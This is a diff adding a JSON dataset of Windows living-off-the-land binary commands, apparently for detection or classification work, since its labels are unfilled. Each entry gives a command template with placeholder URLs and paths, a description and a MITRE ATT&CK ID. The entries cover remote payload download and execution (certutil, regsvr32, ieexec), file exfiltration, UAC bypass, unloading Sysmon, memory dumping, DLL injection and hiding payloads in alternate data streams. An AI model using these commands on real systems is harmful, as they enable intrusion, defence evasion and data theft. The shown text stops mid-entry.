@@ -1,0 +1,1874 @@
+[
+    {
+        "ID": 1,
+        "Command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.",
+        "Description": "AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload. .NET Tool used for updating cache files for Microsoft Office Add-Ins.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 2,
+        "Command": "start ms-appinstaller://?source={REMOTEURL:.exe}",
+        "Description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache. Tool used for installation of AppX/MSIX applications on Windows 10",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 3,
+        "Command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v none -p C:\\users\\cpl.internal\\desktop\\asptest\\ -f C:\\users\\cpl.internal\\desktop\\asptest\\none -u",
+        "Description": "Execute C# code with the Build Provider and proper folder structure in place. ASP.NET Compilation Tool",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 4,
+        "Command": "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",
+        "Description": "Create a recurring task to execute every day at a specific time. Schedule periodic tasks",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1053.002",
+        "Shell": null
+    },
+    {
+        "ID": 5,
+        "Command": "ATBroker.exe /start malware",
+        "Description": "Start a registered Assistive Technology (AT). Helper binary for Assistive Technology (AT)",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 6,
+        "Command": "bash.exe -c \"{CMD}\"",
+        "Description": "Executes executable from bash.exe File used by Windows subsystem for Linux",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 7,
+        "Command": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1",
+        "Description": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job. Used for managing background intelligent transfer",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 8,
+        "Command": "certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}",
+        "Description": "Loads the target DLL file Used for installing certificates",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 9,
+        "Command": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}",
+        "Description": "Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument). Used for requesting and managing certificates",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 10,
+        "Command": "certutil.exe -urlcache -split -f {REMOTEURL:.exe} {PATH:.exe}",
+        "Description": "Download and save executable to disk in the current folder. Windows binary used for handling certificates",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 11,
+        "Command": "cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat",
+        "Description": "Add content to an Alternate Data Stream (ADS). The command-line interpreter in Windows",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 12,
+        "Command": "cmdkey /list",
+        "Description": "List cached credentials creates, lists, and deletes stored user names and passwords or credentials.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1078",
+        "Shell": null
+    },
+    {
+        "ID": 13,
+        "Command": "cmdl32 /vpn /lan %cd%\\config",
+        "Description": "Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter. Microsoft Connection Manager Auto-Download",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 14,
+        "Command": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}",
+        "Description": "Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll. Installs or removes a Connection Manager service profile.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.003",
+        "Shell": null
+    },
+    {
+        "ID": 15,
+        "Command": "colorcpl {PATH}",
+        "Description": "Copies the referenced file to C:\\Windows\\System32\\spool\\drivers\\color\\. Binary that handles color management",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1036.005",
+        "Shell": null
+    },
+    {
+        "ID": 16,
+        "Command": "ComputerDefaults.exe",
+        "Description": "Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\open\\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys/values to set. ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1548.002",
+        "Shell": null
+    },
+    {
+        "ID": 17,
+        "Command": "ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}",
+        "Description": "Upload file, credentials or data exfiltration in general Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1567",
+        "Shell": null
+    },
+    {
+        "ID": 18,
+        "Command": "conhost.exe {CMD}",
+        "Description": "Execute a command line with conhost.exe as parent process Console Window host",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 19,
+        "Command": "control.exe {PATH_ABSOLUTE}:evil.dll",
+        "Description": "Execute evil.dll which is stored in an Alternate Data Stream (ADS). Binary used to launch controlpanel items in Windows",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.002",
+        "Shell": null
+    },
+    {
+        "ID": 20,
+        "Command": "csc.exe -out:{PATH:.exe} {PATH:.cs}",
+        "Description": "Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to the specified .exe path. Binary file used by .NET Framework to compile C# code",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 21,
+        "Command": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs",
+        "Description": "Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS). Binary used to execute scripts in Windows",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 22,
+        "Command": "CustomShellHost.exe",
+        "Description": "Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder. A host process that is used by custom shells when using Windows in Kiosk mode.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 23,
+        "Command": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}",
+        "Description": "Upload file, credentials or data exfiltration in general DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1567",
+        "Shell": null
+    },
+    {
+        "ID": 24,
+        "Command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",
+        "Description": "Downloads the file and sets it as the computer's lockscreen Windows binary used to configure lockscreen/desktop image",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 25,
+        "Command": "DeviceCredentialDeployment",
+        "Description": "Grab the console window handle and set it to hidden Device Credential Deployment",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564",
+        "Shell": null
+    },
+    {
+        "ID": 26,
+        "Command": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",
+        "Description": "Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host) ClickOnce engine in Windows used by .NET",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 27,
+        "Command": "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab",
+        "Description": "Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file. Binary that package existing files into a cabinet (.cab) file",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 28,
+        "Command": "diskshadow.exe /s {PATH:.txt}",
+        "Description": "Execute commands using diskshadow.exe from a prepared diskshadow script. Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003.003",
+        "Shell": null
+    },
+    {
+        "ID": 29,
+        "Command": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}",
+        "Description": "Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details. A command-line interface for managing DNS servers",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1543.003",
+        "Shell": null
+    },
+    {
+        "ID": 30,
+        "Command": "esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o",
+        "Description": "Copies the source VBS file to the destination VBS file. Binary for working with Microsoft Joint Engine Technology (JET) database",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 31,
+        "Command": "eventvwr.exe",
+        "Description": "During startup, eventvwr.exe checks the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user. Displays Windows Event Logs in a GUI window.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1548.002",
+        "Shell": null
+    },
+    {
+        "ID": 32,
+        "Command": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}",
+        "Description": "Copies source file to destination. Binary that expands one or more compressed files",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 33,
+        "Command": "explorer.exe /root,\"{PATH_ABSOLUTE:.exe}\"",
+        "Description": "Execute specified .exe with the parent process spawning from a new instance of explorer.exe Binary used for managing files and system components within Windows",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 34,
+        "Command": "Extexport.exe {PATH_ABSOLUTE:folder} foo bar",
+        "Description": "Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll. Load a DLL located in the c:\\test folder with a specific name.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 35,
+        "Command": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe",
+        "Description": "Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file. Extract to ADS, copy or overwrite a file with Extrac32.exe",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 36,
+        "Command": "findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe",
+        "Description": "Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file. Write to ADS, discover, or download files with Findstr.exe",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 37,
+        "Command": "finger user@example.host.com | more +2 | cmd",
+        "Description": "Downloads payload from remote Finger server. This example connects to \"example.host.com\" asking for user \"user\"; the result could contain malicious shellcode which is executed by the cmd process. Displays information about a user or users on a specified remote computer that is running the Finger service or daemon",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 38,
+        "Command": "fltMC.exe unload SysmonDrv",
+        "Description": "Unloads a driver used by security agents Filter Manager Control Program used by Windows",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1562.001",
+        "Shell": null
+    },
+    {
+        "ID": 39,
+        "Command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"",
+        "Description": "Executes specified command since there is a match for notepad.exe in the c:\\windows\\System32 folder. Selects and executes a command on a file or set of files. This command is useful for batch processing.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 40,
+        "Command": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}",
+        "Description": "Zero out a file File System Utility",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1485",
+        "Shell": null
+    },
+    {
+        "ID": 41,
+        "Command": "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt",
+        "Description": "Executes the commands you put inside the text file. A binary designed for connecting to FTP servers",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 42,
+        "Command": "Gpscript /logon",
+        "Description": "Executes logon scripts configured in Group Policy. Used by group policy to process scripts",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 43,
+        "Command": "HH.exe {REMOTEURL:.bat}",
+        "Description": "Open the target batch script with HTML Help. Binary used for processing chm files in Windows",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 44,
+        "Command": "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}",
+        "Description": "IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache. Microsoft IME Open Extended Dictionary Module",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 45,
+        "Command": "ie4uinit.exe -BaseSettings",
+        "Description": "Executes commands from a specially prepared ie4uinit.inf file. Executes commands from a specially prepared ie4uinit.inf file.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 46,
+        "Command": "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",
+        "Description": "Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe. Diagnostics Utility for Internet Explorer",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 47,
+        "Command": "ieexec.exe {REMOTEURL:.exe}",
+        "Description": "Downloads and executes executable from the remote server. The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 48,
+        "Command": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe",
+        "Description": "Binary file used by .NET to compile C#/intermediate (IL) code to .exe used for compile c# code into dll or exe.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 49,
+        "Command": "InfDefaultInstall.exe {PATH:.inf}",
+        "Description": "Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file. Binary used to perform installation based on content inside inf files",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 50,
+        "Command": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}",
+        "Description": "Execute the target .NET DLL or EXE. The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.004",
+        "Shell": null
+    },
+    {
+        "ID": 51,
+        "Command": "jsc.exe {PATH:.js}",
+        "Description": "Use jsc.exe to compile JavaScript code stored in the provided .JS file and generate a .EXE file with the same name. Binary file used by .NET to compile JavaScript code to .exe or .dll format",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 52,
+        "Command": "Ldifde -i -f {PATH:.ldf}",
+        "Description": "Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt, the file will be downloaded into IE temp folder. Creates, modifies, and deletes LDAP directory objects.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 53,
+        "Command": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab",
+        "Description": "Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file. Binary to package existing files into a cabinet (.cab) file",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 54,
+        "Command": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}",
+        "Description": "Inject evil.dll into a process with PID 3110. Used by App-v in Windows",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.013",
+        "Shell": null
+    },
+    {
+        "ID": 55,
+        "Command": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}",
+        "Description": "Compile and execute C# or VB.net code in a XOML file referenced in the first argument (any extension accepted). A utility included with .NET that is capable of compiling and executing C# or VB.net code.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127",
+        "Shell": null
+    },
+    {
+        "ID": 56,
+        "Command": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}",
+        "Description": "Launch a 'backgrounded' MMC process and invoke a COM payload Load snap-ins to locally and remotely manage Windows systems",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.014",
+        "Shell": null
+    },
+    {
+        "ID": 57,
+        "Command": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}",
+        "Description": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) Binary part of Windows Defender. Used to manage settings in Windows Defender",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 58,
+        "Command": "msbuild.exe {PATH:.xml}",
+        "Description": "Build and execute a C# project stored in the target XML file. Used to compile and execute code",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1127.001",
+        "Shell": null
+    },
+    {
+        "ID": 59,
+        "Command": "Msconfig.exe -5",
+        "Description": "Executes command embeded in crafted c:\\windows\\system32\\mscfgtlc.xml. MSConfig is a troubleshooting tool which is used to temporarily disable or re-enable software, device drivers or Windows services that run during startup process to help the user determine the cause of a problem with Windows",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 60,
+        "Command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE",
+        "Description": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file. Microsoft diagnostics tool",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 61,
+        "Command": "msedge.exe {REMOTEURL:.exe.txt}",
+        "Description": "Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen. Microsoft Edge browser",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 62,
+        "Command": "mshta.exe {PATH:.hta}",
+        "Description": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript. Used by Windows to execute html applications. (.hta)",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.005",
+        "Shell": null
+    },
+    {
+        "ID": 63,
+        "Command": "msiexec /quiet /i {PATH:.msi}",
+        "Description": "Installs the target .MSI file silently. Used by Windows to execute msi files",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.007",
+        "Shell": null
+    },
+    {
+        "ID": 64,
+        "Command": "netsh.exe add helper {PATH_ABSOLUTE:.dll}",
+        "Description": "Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called Netsh is a Windows tool used to manipulate network interface settings.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1546.007",
+        "Shell": null
+    },
+    {
+        "ID": 65,
+        "Command": "ngen.exe {REMOTEURL}",
+        "Description": "Downloads payload from remote server using the Microsoft Native Image Generator utility. Microsoft Native Image Generator.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 66,
+        "Command": "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}",
+        "Description": "Execute DllRegisterServer from DLL specified. Used in Windows for managing ODBC connections",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.008",
+        "Shell": null
+    },
+    {
+        "ID": 67,
+        "Command": "OfflineScannerShell",
+        "Description": "Execute mpclient.dll library in the current working directory Windows Defender Offline Shell",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 68,
+        "Command": "OneDriveStandaloneUpdater",
+        "Description": "Download a file from the web address specified in HKCU\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json OneDrive Standalone Updater",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 69,
+        "Command": "pcalua.exe -a {PATH:.exe}",
+        "Description": "Open the target .EXE using the Program Compatibility Assistant. Program Compatibility Assistant",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1202",
+        "Shell": null
+    },
+    {
+        "ID": 70,
+        "Command": "Pcwrun.exe {PATH_ABSOLUTE:.exe}",
+        "Description": "Open the target .EXE file with the Program Compatibility Wizard. Program Compatibility Wizard",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 71,
+        "Command": "pktmon.exe start --etw",
+        "Description": "Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop Capture Network Packets on the windows 10 with October 2018 Update or later.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1040",
+        "Shell": null
+    },
+    {
+        "ID": 72,
+        "Command": "pnputil.exe -i -a {PATH_ABSOLUTE:.inf}",
+        "Description": "Used for installing drivers Used for installing drivers",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1547",
+        "Shell": null
+    },
+    {
+        "ID": 73,
+        "Command": "Presentationhost.exe {PATH_ABSOLUTE:.xbap}",
+        "Description": "Executes the target XAML Browser Application (XBAP) file File is used for executing Browser applications",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 74,
+        "Command": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}",
+        "Description": "Copy file.exe into the Alternate Data Stream (ADS) of file.txt. Used by Windows to send files to the printer",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 75,
+        "Command": "PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}",
+        "Description": "Create a ZIP file from a folder in a remote drive Printer Migration Command-Line Tool",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1105",
+        "Shell": null
+    },
+    {
+        "ID": 76,
+        "Command": "provlaunch.exe LOLBin",
+        "Description": "Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution. Launcher process",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 77,
+        "Command": "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0",
+        "Description": "Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file. Windows Problem Steps Recorder, used to record screen and clicks.",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1113",
+        "Shell": null
+    },
+    {
+        "ID": 78,
+        "Command": "rasautou -d {PATH:.dll} -p export_name -a a -e e",
+        "Description": "Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10. Windows Remote Access Dialer",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 79,
+        "Command": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1",
+        "Description": "Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk). Microsoft Windows resource leak diagnostic tool",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1003",
+        "Shell": null
+    },
+    {
+        "ID": 80,
+        "Command": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg",
+        "Description": "Export the target Registry key and save it to the specified .REG file within an Alternate data stream. Used to manipulate the registry",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 81,
+        "Command": "regasm.exe {PATH:.dll}",
+        "Description": "Loads the target .NET DLL file and executes the RegisterClass function. Part of .NET",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.009",
+        "Shell": null
+    },
+    {
+        "ID": 82,
+        "Command": "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey",
+        "Description": "Export the target Registry key to the specified .REG file. Used by Windows to manipulate registry",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 83,
+        "Command": "regini.exe {PATH}:hidden.ini",
+        "Description": "Write registry keys from data inside the Alternate data stream. Used to manipulate the registry",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1564.004",
+        "Shell": null
+    },
+    {
+        "ID": 84,
+        "Command": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}",
+        "Description": "Load the target .DLL. Used to register new wmi providers",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218",
+        "Shell": null
+    },
+    {
+        "ID": 85,
+        "Command": "regsvcs.exe {PATH:.dll}",
+        "Description": "Loads the target .NET DLL file and executes the RegisterClass function. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies",
+        "Score": null,
+        "GoodOrBad": null,
+        "MitreAttackClassification": "T1218.009",
+        "Shell": null
+    },
+    {
+        "ID": 86,
+        "Command": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll",
+        "Description": "Execute the specified remote .SCT script with scrobj.dll. Used by Windows to register dlls",
+        "Score": null,
